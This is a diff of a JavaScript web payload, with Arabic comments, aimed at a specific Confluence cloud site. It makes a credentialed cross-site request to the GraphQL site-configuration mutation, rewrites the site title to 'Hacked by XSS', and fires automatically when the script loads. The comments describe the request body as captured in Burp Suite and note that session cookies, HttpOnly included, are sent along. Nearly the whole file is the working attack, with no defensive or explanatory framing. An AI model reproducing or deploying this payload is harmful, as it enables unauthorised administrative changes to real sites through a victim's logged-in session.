@@ -1,72 +1,61 @@
-function loadDoc1() {
+function changeConfluenceTitle() {
   var xhttp = new XMLHttpRequest();
+  // نستخدم المسار النسبي أو الدومين الكامل طالما أنه نفس النطاق
+  var url = "https://anshall.atlassian.net/wiki/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";
 
-  xhttp.open(
-    "POST",
-    "https://anshall.atlassian.net/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation",
-    true
-  );
+  xhttp.open("POST", url, true);
 
-  xhttp.setRequestHeader("Content-Type", "application/json");
+  // إعداد الرؤوس المطلوبة
+  xhttp.setRequestHeader("Content-type", "application/json");
+  xhttp.setRequestHeader("Accept", "*/*");
+  
+  // تفعيل إرسال الكوكيز تلقائياً (بما فيها HttpOnly)
   xhttp.withCredentials = true;
 
-  xhttp.onreadystatechange = function () {
-    if (this.readyState === 4) {
-      console.log("Status:", this.status);
-      console.log("Response:", this.responseText);
+  // بناء جسم الطلب (Payload) بناءً على ما استخرجته من Burp Suite
+  var data = JSON.stringify([{
+    "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
+    "variables": {
+      "siteConfigInput": {
+        "siteTitle": "Hacked by XSS", // العنوان الجديد الذي تريد وضعه
+        "customContactMessage": "xxxx",
+        "isContactAdministratorsFormEnabled": true,
+        "siteHomePage": "Confluence Home",
+        "isEditorConversionForSiteEnabled": true,
+        "isEditorFullWidthEnabled": false,
+        "isEmailNotificationEnabled": true,
+        "isPushNotificationEnabled": true,
+        "isLikesEnabled": true,
+        "timeFormat": "h:mm a",
+        "dateTimeFormat": "MMM dd, yyyy HH:mm",
+        "dateFormat": "MMM dd, yyyy",
+        "longNumberFormat": "###############",
+        "decimalNumberFormat": "###############.##########",
+        "maxAttachmentSize": 104857600,
+        "maxNumberOfAttachmentsPerUpload": 6,
+        "isExternalConnectionsEnabled": true,
+        "connectionTimeout": 10000,
+        "socketTimeout": 10000,
+        "globalDefaultLocale": "en_US",
+        "indexingLanguage": "english"
+      }
+    },
+    "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
+  }]);
+
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4) {
+      console.log("Status: " + this.status);
+      if (this.status == 200) {
+        console.log("Confluence Title Changed Successfully!");
+      } else {
+        console.log("Failed. Response: " + this.responseText);
+      }
     }
   };
-
-  var data = JSON.stringify([
-    {
-      operationName: "ConfigurationFormConfigurationPageUpdateMutation",
-      variables: {
-        siteConfigInput: {
-          siteTitle: "Confluencexxalap",               
-          customContactMessage: "xxxxlap",             
-          isContactAdministratorsFormEnabled: true,
-          siteHomePage: "Confluence Home",
-          isEditorConversionForSiteEnabled: true,
-          isEditorFullWidthEnabled: false,
-          isEmailNotificationEnabled: true,
-          isPushNotificationEnabled: true,
-          isLikesEnabled: true,
-          timeFormat: "h:mm a",
-          dateTimeFormat: "MMM dd, yyyy HH:mm",
-          dateFormat: "MMM dd, yyyy",
-          longNumberFormat: "###############",
-          decimalNumberFormat: "###############.##########",
-          maxAttachmentSize: 104857600,
-          maxNumberOfAttachmentsPerUpload: 6,
-          isExternalConnectionsEnabled: true,
-          connectionTimeout: 10000,
-          socketTimeout: 10000,
-          globalDefaultLocale: "en_US",
-          indexingLanguage: "english"
-        }
-      },
-      query: `
-        mutation ConfigurationFormConfigurationPageUpdateMutation(
-          $siteConfigInput: ConfluenceUpdateSiteConfigurationInput!
-        ) {
-          confluence {
-            updateSiteConfiguration(input: $siteConfigInput) {
-              success
-              errors {
-                message
-                extensions {
-                  errorType
-                  statusCode
-                }
-              }
-            }
-          }
-        }
-      `
-    }
-  ]);
 
   xhttp.send(data);
 }
 
-window.onload = loadDoc1;
+// تنفيذ الدالة عند تحميل الصفحة
+changeConfluenceTitle();
